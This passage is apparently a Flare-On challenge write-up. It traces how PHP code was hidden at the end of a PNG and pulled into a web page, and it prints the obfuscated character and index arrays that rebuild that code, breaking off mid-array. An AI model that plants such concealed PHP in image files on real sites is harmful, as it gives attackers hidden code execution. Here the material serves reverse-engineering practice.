<p>Inside the archive seems to be a copy of the original <a href="http://flare-on.com">http://flare-on.com</a> with a launch date countdown timer. I will be calling the html page from the website <code>original_html</code> and the one in the zip file <code>challenge_html</code>.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Contents of challenge zip file </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
</pre></td><td class="code"><pre><code class="powershell"><span class="line"><span class="n">-rwx</span><span class="p">------+</span> <span class="n">1</span> <span class="n">TyRaX</span> <span class="n">None</span> <span class="n">8378</span> <span class="n">home</span><span class="p">.</span><span class="n">html</span>
</span><span class="line">
</span><span class="line"><span class="n">directory</span> <span class="n">called</span> <span class="s2">&quot;img&quot;</span> <span class="n">with</span> <span class="n">one</span> <span class="n">single</span> <span class="n">png</span>
</span><span class="line"><span class="n">-rwx</span><span class="p">------+</span> <span class="n">1</span> <span class="n">TyRaX</span> <span class="n">None</span> <span class="n">9560</span> <span class="n">flare-on</span><span class="p">.</span><span class="n">png</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p><img src="http://parsiya.net/images/2014/flare/2-1.jpg" alt="challenge_html" title="challenge_html" /></p>

<p>The original web page looks a bit different.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Original web page </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
</pre></td><td class="code"><pre><code class="powershell"><span class="line"><span class="n">-rwx</span><span class="p">------+</span> <span class="n">1</span> <span class="n">TyRaX</span> <span class="n">None</span> <span class="n">6254</span> <span class="n">The</span> <span class="n">FLARE</span> <span class="n">On</span> <span class="n">Challenge</span><span class="p">.</span><span class="n">htm</span>
</span><span class="line">
</span><span class="line"><span class="n">and</span>
</span><span class="line"><span class="n">-rwx</span><span class="p">------+</span> <span class="n">1</span> <span class="n">TyRaX</span> <span class="n">None</span> <span class="n">116290</span> <span class="n">bootstrap</span><span class="p">.</span><span class="n">css</span>
</span><span class="line"><span class="n">-rwx</span><span class="p">------+</span> <span class="n">1</span> <span class="n">TyRaX</span> <span class="n">None</span>   <span class="n">6596</span> <span class="n">flare-on-V2</span><span class="p">.</span><span class="n">png</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p><img src="http://parsiya.net/images/2014/flare/2-2.jpg" alt="original_html" title="original_html" /></p>

<p>The timer threw me off track. Is it really a countdown timer? When does it reach zero?<br />
I changed the time in my VM to mess with it but it synced up with host.  </p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>To de-sync guest and host time/date </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
</pre></td><td class="code"><pre><code class="powershell"><span class="line"><span class="c"># vboxmanage is in the VirtualBox installation directory</span>
</span><span class="line"><span class="c"># So on Windows: C:\Program Files\Oracle\VirtualBox</span>
</span><span class="line"><span class="n">vboxmanage</span> <span class="n">setextradata</span> <span class="no">[VMname]</span> <span class="s2">&quot;VBoxInternal/Devices/VMMDev/0/Config/GetHostTimeDisabled&quot;</span> <span class="s2">&quot;1&quot;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Changing the time did not mess with anything.</p>

<p>We can diff the htmls or use Notepad++’s <a href="http://www.davidtan.org/how-to-compare-two-text-files-using-notepad-plus/">compare</a> plugin.
Most differences are aesthetic. There are two interesting differences. In line 54, <code>original_html</code> has <code>&lt;img src="The%20FLARE%20On%20Challenge_files/flare-on-V2.png"&gt;</code> while <code>challenge_html</code> includes <code>&lt;img src="img/flare-on.png"&gt;</code>. So the file in the website is version 2 of the image. Later in the <code>challenge_html</code> we see more evidence of this image file <code>&lt;?php include "img/flare-on-V3.png" ?&gt;</code>. But wiat a minute, the filesize of these images were different:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Different sizes </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
</pre></td><td class="code"><pre><code class="powershell"><span class="line"><span class="n">-rwx</span><span class="p">------+</span> <span class="n">1</span> <span class="n">TyRaX</span> <span class="n">None</span> <span class="n">9560</span> <span class="n">Jul</span>  <span class="n">7</span> <span class="n">21</span><span class="err">:</span><span class="n">30</span> <span class="n">flare-on</span><span class="p">.</span><span class="n">png</span>
</span><span class="line"><span class="n">-rwx</span><span class="p">------+</span> <span class="n">1</span> <span class="n">TyRaX</span> <span class="n">None</span> <span class="n">6596</span> <span class="n">Dec</span> <span class="n">18</span>  <span class="n">2013</span> <span class="n">flare-on-V2</span><span class="p">.</span><span class="n">png</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>The challenge png is bigger. I used <code>HxD</code> to compare these two files (as they are not text) and at the end of <code>flare-on.png</code> I saw some PHP code. To be honest I was thinking of steganography or some <a href="https://twitter.com/angealbertini">Ange Albertini magic</a>. But that would have been too hard for level 2. Here is the PHP code (beautified):</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Code inside png </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
</pre></td><td class="code"><pre><code class="php"><span class="line"><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class="line"><span class="nv">$terms</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;M&quot;</span><span class="p">,</span> <span class="s2">&quot;Z&quot;</span><span class="p">,</span> <span class="s2">&quot;]&quot;</span><span class="p">,</span> <span class="s2">&quot;p&quot;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">,</span> <span class="s2">&quot;f&quot;</span><span class="p">,</span> <span class="s2">&quot;1&quot;</span><span class="p">,</span> <span class="s2">&quot;v&quot;</span><span class="p">,</span> <span class="s2">&quot;&lt;&quot;</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span><span class="p">,</span> <span class="s2">&quot;Q&quot;</span><span class="p">,</span> <span class="s2">&quot;z&quot;</span><span class="p">,</span> <span class="s2">&quot; &quot;</span><span class="p">,</span> <span class="s2">&quot;s&quot;</span><span class="p">,</span> <span class="s2">&quot;m&quot;</span><span class="p">,</span> <span class="s2">&quot;+&quot;</span><span class="p">,</span> <span class="s2">&quot;E&quot;</span><span class="p">,</span> <span class="s2">&quot;D&quot;</span><span class="p">,</span> <span class="s2">&quot;g&quot;</span><span class="p">,</span> <span class="s2">&quot;W&quot;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;q&quot;</span><span class="p">,</span> <span class="s2">&quot;y&quot;</span><span class="p">,</span> <span class="s2">&quot;T&quot;</span><span class="p">,</span> <span class="s2">&quot;V&quot;</span><span class="p">,</span> <span class="s2">&quot;n&quot;</span><span class="p">,</span> <span class="s2">&quot;S&quot;</span><span class="p">,</span> <span class="s2">&quot;X&quot;</span><span class="p">,</span> <span class="s2">&quot;)&quot;</span><span class="p">,</span> <span class="s2">&quot;9&quot;</span><span class="p">,</span> <span class="s2">&quot;C&quot;</span><span class="p">,</span> <span class="s2">&quot;P&quot;</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">,</span> <span class="s2">&quot;&amp;&quot;</span><span class="p">,</span> <span class="s2">&quot;\&#39;&quot;</span><span class="p">,</span> <span class="s2">&quot;!&quot;</span><span class="p">,</span> <span class="s2">&quot;x&quot;</span><span class="p">,</span> <span class="s2">&quot;G&quot;</span><span class="p">,</span> <span class="s2">&quot;:&quot;</span><span class="p">,</span> <span class="s2">&quot;2&quot;</span><span class="p">,</span> <span class="s2">&quot;~&quot;</span><span class="p">,</span> <span class="s2">&quot;O&quot;</span><span class="p">,</span> <span class="s2">&quot;h&quot;</span><span class="p">,</span> <span class="s2">&quot;u&quot;</span><span class="p">,</span> <span class="s2">&quot;U&quot;</span><span class="p">,</span> <span class="s2">&quot;@&quot;</span><span class="p">,</span> <span class="s2">&quot;;&quot;</span><span class="p">,</span> <span class="s2">&quot;H&quot;</span><span class="p">,</span> <span class="s2">&quot;3&quot;</span><span class="p">,</span> <span class="s2">&quot;F&quot;</span><span class="p">,</span> <span class="s2">&quot;6&quot;</span><span class="p">,</span> <span class="s2">&quot;b&quot;</span><span class="p">,</span> <span class="s2">&quot;L&quot;</span><span class="p">,</span> <span class="s2">&quot;&gt;&quot;</span><span class="p">,</span> <span class="s2">&quot;^&quot;</span><span class="p">,</span> <span class="s2">&quot;,&quot;</span><span class="p">,</span> <span class="s2">&quot;.&quot;</span><span class="p">,</span> <span class="s2">&quot;l&quot;</span><span class="p">,</span> <span class="s2">&quot;$&quot;</span><span class="p">,</span> <span class="s2">&quot;d&quot;</span><span class="p">,</span> <span class="s2">&quot;`&quot;</span><span class="p">,</span> <span class="s2">&quot;%&quot;</span><span class="p">,</span> <span class="s2">&quot;N&quot;</span><span class="p">,</span> <span class="s2">&quot;*&quot;</span><span class="p">,</span> <span class="s2">&quot;[&quot;</span><span class="p">,</span> <span class="s2">&quot;0&quot;</span><span class="p">,</span> <span class="s2">&quot;}&quot;</span><span class="p">,</span> <span class="s2">&quot;J&quot;</span><span class="p">,</span> <span class="s2">&quot;-&quot;</span><span class="p">,</span> <span class="s2">&quot;5&quot;</span><span class="p">,</span> <span class="s2">&quot;_&quot;</span><span class="p">,</span> <span class="s2">&quot;A&quot;</span><span class="p">,</span> <span class="s2">&quot;=&quot;</span><span class="p">,</span> <span class="s2">&quot;{&quot;</span><span class="p">,</span> <span class="s2">&quot;k&quot;</span><span class="p">,</span> <span class="s2">&quot;o&quot;</span><span class="p">,</span> <span class="s2">&quot;7&quot;</span><span class="p">,</span> <span class="s2">&quot;#&quot;</span><span class="p">,</span> <span class="s2">&quot;i&quot;</span><span class="p">,</span> <span class="s2">&quot;I&quot;</span><span class="p">,</span> <span class="s2">&quot;Y&quot;</span><span class="p">,</span> <span class="s2">&quot;(&quot;</span><span class="p">,</span> <span class="s2">&quot;j&quot;</span><span class="p">,</span> <span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="s2">&quot;?&quot;</span><span class="p">,</span> <span class="s2">&quot;K&quot;</span><span class="p">,</span> <span class="s2">&quot;c&quot;</span><span class="p">,</span> <span class="s2">&quot;B&quot;</span><span class="p">,</span> <span class="s2">&quot;t&quot;</span><span class="p">,</span> <span class="s2">&quot;R&quot;</span><span class="p">,</span> <span class="s2">&quot;4&quot;</span><span class="p">,</span> <span class="s2">&quot;8&quot;</span><span class="p">,</span> <span class="s2">&quot;e&quot;</span><span class="p">,</span> <span class="s2">&quot;|&quot;</span><span class="p">);</span>
</span><span class="line"><span class="nv">$order</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="mi">59</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">35</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">76</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">76</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">45</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">60</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">43</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">43</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">60</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">45</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">27</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">77</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">76</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">27</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">45</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">43</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">60</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">45</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span 